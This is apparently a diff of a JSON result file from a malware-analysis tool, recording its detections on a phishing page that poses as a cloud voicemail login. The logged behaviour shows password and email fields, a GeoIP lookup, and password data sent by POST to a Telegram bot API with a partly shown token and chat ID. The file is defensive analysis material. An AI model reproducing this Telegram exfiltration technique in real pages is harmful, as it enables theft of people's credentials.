@@ -1,11 +1,11 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 3263,
+    "score": 3743,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "HTML document has password / email / username input fields\n\t- <input> element 'floatingInput' contains the following phishing terms: 'email'\n\t- <input> element 'floatingPassword' contains the following phishing terms: 'password'\n\t- <input> element 'UserEmail' contains the following phishing terms: 'email'",
+        "body": "HTML document has password / email / username input fields\n\t- <input> element 'UserEmail' contains the following phishing terms: 'email'\n\t- <input> element 'floatingInput' contains the following phishing terms: 'email'\n\t- <input> element 'floatingPassword' contains the following phishing terms: 'password'",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -58,30 +58,6 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLButtonElement[33].click(anonymous)\n",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "append_and_click": 10
-          },
-          "signatures": {
-            "append_and_click": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: AppendAndClick",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
         "body": "A domain associated with GeoIP services was observed\n\t\tDomain 'ip.seeip.org' is for a GeoIP service.\n",
         "body_config": {},
         "body_format": "TEXT",
@@ -130,7 +106,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[42].send()\n",
+        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[43].send()\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -178,7 +154,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript makes network request via POST with password data.\n\t\tXMLHttpRequest[43].send({\"chat_id\":\"-571909261\",\"text\":\"///Liftca Cloud Voicemail by Agbasa Juju(Wee...\n\t\tXMLHttpRequest[43].send({\"chat_id\":\"-571909261\",\"text\":\"///Liftca Cloud Voicemail by Agbasa Juju(Wee...",
+        "body": "JavaScript makes network request via POST with password data.\n\t\tXMLHttpRequest[44].send({\"chat_id\":\"-571909261\",\"text\":\"///Liftca Cloud Voicemail by Agbasa Juju(Wee...\n\t\tXMLHttpRequest[44].send({\"chat_id\":\"-571909261\",\"text\":\"///Liftca Cloud Voicemail by Agbasa Juju(Wee...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -187,9 +163,9 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 3,
-          "score": 10,
+          "score": 500,
           "score_map": {
-            "phishing_post_password": 10
+            "phishing_post_password": 500
           },
           "signatures": {
             "phishing_post_password": 1
@@ -250,7 +226,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "An outgoing request was made to Telegram\n\t\tXMLHttpRequest[43].open(post,https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pv...",
+        "body": "An outgoing request was made to Telegram\n\t\tXMLHttpRequest[44].open(post,https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pv...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -497,13 +473,6 @@
         "attack_ids": [],
         "heur_id": 2,
         "signatures": []
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "append_and_click"
-        ]
       },
       {
         "attack_ids": [],
